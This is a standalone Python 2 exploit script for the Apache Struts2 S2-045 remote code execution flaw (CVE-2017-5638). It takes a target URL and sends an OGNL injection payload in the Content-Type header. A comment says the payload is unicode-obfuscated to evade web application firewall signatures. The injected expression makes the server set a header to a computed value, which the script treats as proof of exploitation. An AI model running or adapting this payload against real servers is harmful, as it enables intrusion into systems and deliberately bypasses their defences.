# Payload Reference - https://blog.qualys.com/securitylabs/2017/03/14/apache-struts-cve-2017-5638-vulnerability-and-the-qualys-solution
# Web application firewall vendors updated signatures to detect this exploit, so obfuscated payload using unicode


#!/usr/bin/python

import requests
import sys

if sys.argv[1]:
    url = sys.argv[1]
    print "\n[] Target URL is : " + url + "\n"
    print "[] Sending payload"
    
    payload = "%{{\u0023context['com\u002eopensymphony\u002exwork2\u002edispatcher\u002eHttpServletResponse']\u002eaddHeader\u0028\u0027x-xxx-struts\u0027\u002C3195\u002a5088\u0029}}\u002emultipart/form-data"
    headers =  {'Content-Type': payload}
    r = requests.get(url, headers=headers)
     
    if r :
        print "[] Response recieved!\n"

        if r.headers['x-xxx-struts'] == "16256160":
            print "[] Exploitation Successful!!\n"
            print "[] Evidence : New header x-xxx-struts set by exploit as - \n"
            print " [ x-xxx-struts :" + r.headers['x-xxx-struts'] +" ]\n "
            print url + " application is vulnerable to Remote Code Execution Vulnerability."
            print "\n"
    
else:
    print "CVE-2017-5638 - Apache Struts2 S2-045 Remote Code Execution \n"
    print "Usage: s2-045.py <target URL>"
    
